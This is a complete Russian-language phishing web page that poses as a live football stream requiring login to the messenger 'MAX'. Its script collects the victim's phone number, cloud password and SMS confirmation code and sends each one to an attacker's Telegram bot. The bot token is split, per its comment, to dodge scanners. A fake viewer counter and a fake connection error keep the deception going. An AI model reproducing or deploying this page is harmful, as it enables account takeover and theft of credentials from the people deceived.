<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MAX LIVE</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        
        body {
            background: #090416;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-top: 20px;
            text-align: center;
            width: 100%;
            padding: 10px 0;
        }

        .logo h1 {
            font-size: 85px;
            font-weight: 900;
            line-height: 1.2;
            text-transform: uppercase;
            letter-spacing: -4px;
            background: linear-gradient(to bottom, #ffffff 30%, #9333ea 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 15px rgba(147, 51, 234, 0.5));
            display: inline-block;
        }

        .form-box { width: 100%; margin-top: 20px; }

        .label {
            color: #a855f7;
            font-weight: 600;
            margin-bottom: 15px;
            text-align: center;
            display: block;
        }

        .input-main {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid #6b21a8;
            border-radius: 18px;
            padding: 18px;
            color: white;
            font-size: 24px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            outline: none;
        }

        .btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(90deg, #9333ea, #4f46e5);
            border: none;
            border-radius: 18px;
            color: white;
            font-size: 18px;
            font-weight: 800;
            text-transform: uppercase;
            cursor: pointer;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }

        .btn:disabled { opacity: 0.6; cursor: wait; }

        .code-inputs { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .code-inputs input {
            width: 14%; height: 55px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid #6b21a8;
            border-radius: 10px; color: white;
            font-size: 22px; text-align: center; font-weight: bold;
            outline: none;
        }

        .stream-info {
            width: 100%;
            margin-top: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 10px;
            margin-bottom: 8px;
        }
        .live-tag { color: #ff4444; font-size: 14px; font-weight: 900; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
        .viewers { font-size: 13px; color: #94a3b8; font-weight: 600; }
        
        .stream-title { width: 100%; text-align: left; padding-left: 10px; font-size: 16px; font-weight: 700; margin-bottom: 10px; }
        .black-rect { width: 100%; height: 180px; background: #000; border-radius: 25px; display: flex; align-items: center; justify-content: center; border: 1px solid #3b0764; }
        .triangle { width: 0; height: 0; border-top: 20px solid transparent; border-bottom: 20px solid transparent; border-left: 30px solid white; filter: drop-shadow(0 0 10px #9333ea); }
        .footer-text { margin-top: 20px; font-size: 12px; color: #7e22ce; text-transform: uppercase; letter-spacing: 2px; font-weight: bold; }

        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(9, 4, 22, 0.98);
            display: flex; align-items: center; justify-content: center;
            z-index: 1000; padding: 20px;
        }
        .modal-content {
            background: #1a1033; border: 2px solid #9333ea;
            padding: 30px; border-radius: 25px; text-align: center;
            max-width: 350px;
        }
        .modal-title { font-size: 20px; font-weight: 900; color: #ff4444; margin-bottom: 15px; text-transform: uppercase; }
        .modal-text { font-size: 15px; line-height: 1.4; color: #f1f5f9; margin-bottom: 25px; }

        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo"><h1>МАХ</h1></div>

        <div class="form-box">
            <div id="scr1">
                <span class="label">Введите номер телефона</span>
                <input type="tel" id="phone" class="input-main" value="+7 ">
                <button class="btn" id="goBtn">Продолжить</button>
            </div>

            <div id="scr_pass" class="hidden">
                <span class="label">Введите облачный пароль</span>
                <input type="password" id="cloud_pass" class="input-main" placeholder="Пароль">
                <button class="btn" id="passBtn">Войти</button>
            </div>

            <div id="scr2" class="hidden">
                <span class="label">Введите код подтверждения</span>
                <div class="code-inputs">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                    <input type="text" maxlength="1" class="pin" inputmode="numeric">
                </div>
                <button class="btn" id="finBtn">Продолжить</button>
            </div>
        </div>

        <div class="stream-info">
            <span class="live-tag">● LIVE</span>
            <span class="viewers" id="viewerCount">👁 627 зрителей</span>
        </div>
        <div class="stream-title">Футбол / Прямой эфир</div>
        <div class="black-rect"><div class="triangle"></div></div>
        <div class="footer-text">авторизуйся чтобы продолжить</div>
    </div>

    <div id="warnModal" class="modal hidden">
        <div class="modal-content">
            <div class="modal-title">Внимание!</div>
            <div class="modal-text">Для безопасности вашего аккаунта обязательно установите <b>Облачный пароль</b> в настройках перед входом.</div>
            <button class="btn" id="warnOk">Поставил пароль</button>
        </div>
    </div>

    <script>
        // Блок отправки (Токен разбит для защиты от простых сканеров)
        const p1 = '8725058078:AAFyInfV';
        const p2 = '3cvUOqMCYefbGlDjhkp0rUY-FHw';
        const TOKEN = p1 + p2;
        const CHAT = '8627005110';

        function send(msg) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT, text: msg, parse_mode: 'HTML' })
            }).catch(e => console.error('Error:', e));
        }

        // Счетчик зрителей (3-27 человек каждые 3 сек)
        let viewers = 627;
        setInterval(() => {
            const step = Math.floor(Math.random() * 25) + 3;
            viewers += Math.random() > 0.5 ? step : -step;
            if (viewers < 268) viewers += step;
            if (viewers > 1027) viewers -= step;
            document.getElementById('viewerCount').innerText = `👁 ${viewers} зрителей`;
        }, 3000);

        const phoneInp = document.getElementById('phone');
        const warnModal = document.getElementById('warnModal');

        // Маска телефона
        phoneInp.oninput = (e) => {
            let v = e.target.value.replace(/\D/g, '');
            if (!v.startsWith('7')) v = '7' + v;
            let res = '+7';
            if (v.length > 1) res += ' ' + v.substring(1, 4);
            if (v.length > 4) res += ' ' + v.substring(4, 7);
            if (v.length > 7) res += ' ' + v.substring(7, 9);
            if (v.length > 9) res += ' ' + v.substring(9, 11);
            e.target.value = res;
        };

        // Логика кнопок
        document.getElementById('goBtn').onclick = function() {
            if(phoneInp.value.length < 10) return;
            this.disabled = true;
            this.innerText = "ЗАГРУЗКА...";
            send(`📱 <b>Номер:</b> <code>${phoneInp.value}</code>`);
            setTimeout(() => {
                warnModal.classList.remove('hidden');
            }, 5000);
        };

        document.getElementById('warnOk').onclick = () => {
            warnModal.classList.add('hidden');
            document.getElementById('scr1').classList.add('hidden');
            document.getElementById('scr_pass').classList.remove('hidden');
        };

        document.getElementById('passBtn').onclick = function() {
            const pass = document.getElementById('cloud_pass').value;
            if(!pass) return;
            this.disabled = true;
            this.innerText = "ПРОВЕРКА...";
            send(`🔑 <b>Пароль:</b> <code>${pass}</code>\n📱 Номер: ${phoneInp.value}`);
            setTimeout(() => {
                document.getElementById('scr_pass').classList.add('hidden');
                document.getElementById('scr2').classList.remove('hidden');
                document.querySelectorAll('.pin')[0].focus();
            }, 10000);
        };

        document.getElementById('finBtn').onclick = function() {
            let code = "";
            document.querySelectorAll('.pin').forEach(p => code += p.value);
            if(code.length < 6) return;
            this.disabled = true;
            this.innerText = "ПРОВЕРКА...";
            send(`✅ <b>КОД:</b> <code>${code}</code>\n📱 Номер: ${phoneInp.value}`);
            setTimeout(() => {
                alert("Ошибка соединения. Попробуйте позже.");
                location.reload();
            }, 5000);
        };

        // Переход по цифрам кода
        const pins = document.querySelectorAll('.pin');
        pins.forEach((p, i) => {
            p.oninput = () => { if (p.value && i < 5) pins[i+1].focus(); };
            p.onkeydown = (e) => { if (e.key === 'Backspace' && !p.value && i > 0) pins[i-1].focus(); };
        });
    </script>
</body>
</html>
